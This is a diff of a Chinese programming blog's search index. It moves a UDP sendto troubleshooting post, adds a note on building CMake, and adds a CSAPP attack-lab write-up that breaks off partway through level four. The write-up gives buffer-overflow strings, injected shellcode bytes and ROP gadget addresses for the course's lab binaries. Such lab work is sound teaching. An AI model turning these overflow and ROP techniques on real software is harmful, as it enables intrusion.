@@ -78,41 +78,6 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次UDP sendto函数错误解决</title>
-    <url>/2020/03/29/2020-03-29-solve-sendto-error/</url>
-    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在编写使用select函数的TCP和UDP回射程序，出现UDP的sendto错误，现象如下：</p>
-<ul>
-<li><p>服务端正常启动后，调用select函数监听TCP和UDP套接字, 可以正常处理TCP请求。</p>
-</li>
-<li><p>UDP客户端可以连接到服务端，但接收标准输入后无回显，阻塞于recvfrom。</p>
-</li>
-</ul>
-<span id="more"></span>
-
-<h3 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h3><p>经排查，发现服务端处理UDP请求的代码有问题，如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">SA</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len);</span><br><span class="line">	sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>udp_echo函数，先用recvfrom读取UDP客户端发送的字符串，再使用sendto将该字符串送回客户端。代码中没有判断recvfrom, sendto函数的返回值，为了获取出错信息改写如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	<span class="keyword">if</span>((n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		err_sys(<span class="string">&quot;recvfrom error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len) != n) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">		err_sys(<span class="string">&quot;sendto error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再运行程序，输出如下:<br>$ error: Invalid argument<br>$ sendto error</p>
-<p>错误原因在于cliaddr参数没有初始化。<strong>sockaddr_in结构体在使用之前，需要先使用bzero&#x2F;memset函数初始化为0</strong>，否则出现赋值不完整导致参数无效。</p>
-<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul>
-<li><p>变量使用之前最好初始化。</p>
-</li>
-<li><p>注意判断函数的返回值，可以使用包裹函数。</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>troubleshooting</category>
-      </categories>
-      <tags>
-        <tag>troubleshooting</tag>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>隐式函数声明[-Wimplicit-function-declaration]</title>
     <url>/2020/04/11/2020-04-11-what-is-implicit-function-declaration/</url>
     <content><![CDATA[<h2 id="什么是隐式函数声明"><a href="#什么是隐式函数声明" class="headerlink" title="什么是隐式函数声明"></a>什么是隐式函数声明</h2><p>C语言中，函数调用前不一定要声明。如果没有声明，编译器会自动按照一种隐式声明规则，为调用函数的C代码产生汇编代码。</p>
@@ -149,6 +114,41 @@
       </categories>
       <tags>
         <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次UDP sendto函数错误解决</title>
+    <url>/2020/03/29/2020-03-29-solve-sendto-error/</url>
+    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在编写使用select函数的TCP和UDP回射程序，出现UDP的sendto错误，现象如下：</p>
+<ul>
+<li><p>服务端正常启动后，调用select函数监听TCP和UDP套接字, 可以正常处理TCP请求。</p>
+</li>
+<li><p>UDP客户端可以连接到服务端，但接收标准输入后无回显，阻塞于recvfrom。</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h3><p>经排查，发现服务端处理UDP请求的代码有问题，如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">SA</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len);</span><br><span class="line">	sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>udp_echo函数，先用recvfrom读取UDP客户端发送的字符串，再使用sendto将该字符串送回客户端。代码中没有判断recvfrom, sendto函数的返回值，为了获取出错信息改写如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	<span class="keyword">if</span>((n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		err_sys(<span class="string">&quot;recvfrom error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len) != n) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">		err_sys(<span class="string">&quot;sendto error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再运行程序，输出如下:<br>$ error: Invalid argument<br>$ sendto error</p>
+<p>错误原因在于cliaddr参数没有初始化。<strong>sockaddr_in结构体在使用之前，需要先使用bzero&#x2F;memset函数初始化为0</strong>，否则出现赋值不完整导致参数无效。</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul>
+<li><p>变量使用之前最好初始化。</p>
+</li>
+<li><p>注意判断函数的返回值，可以使用包裹函数。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>troubleshooting</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>troubleshooting</tag>
       </tags>
   </entry>
   <entry>
@@ -388,6 +388,217 @@
       </categories>
       <tags>
         <tag>GDB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>源码编译并安装CMake</title>
+    <url>/2020/07/26/2020-07-26-how-to-compile-and-install-cmake/</url>
+    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>查看cmake版本，检查是否安装成功</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CMake</category>
+      </categories>
+      <tags>
+        <tag>CMake</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSAPP 缓冲区溢出实验</title>
+    <url>/2020/08/02/2020-08-02-csapp-buflab/</url>
+    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
+<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
+</li>
+<li><p><code>gdb</code>和<code>objdump</code>使用</p>
+</li>
+<li><p>x86_64下的汇编</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
+<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
+<ul>
+<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
+</li>
+<li><p><code>rtarget</code>：ROP攻击的程序。</p>
+</li>
+<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
+</li>
+<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
+</li>
+<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
+</li>
+</ul>
+<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
+<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
+<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
+<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>
+
+<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
+<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+<p>构造攻击字符串, 写到文件<code>hex1</code></p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
+<ul>
+<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
+</li>
+<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
+</li>
+<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
+</li>
+</ul>
+<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
+
+<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
+<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
+<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>综上，得到我们需要输入的字符串</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
+<ul>
+<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
+</li>
+<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
+</li>
+<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
+</li>
+</ul>
+<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>我第一次写这块汇编代码时，犯了两个错误：</p>
+<ul>
+<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
+</li>
+<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
+</li>
+</ul>
+<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
+<p>综上，得到我们需要输入字符串</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
+<ul>
+<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
+<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
+</ul>
+<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
+<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
+<ul>
+<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
+<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
+</ul>
+<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
+<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>
+
+<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
+<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
+<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
+<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
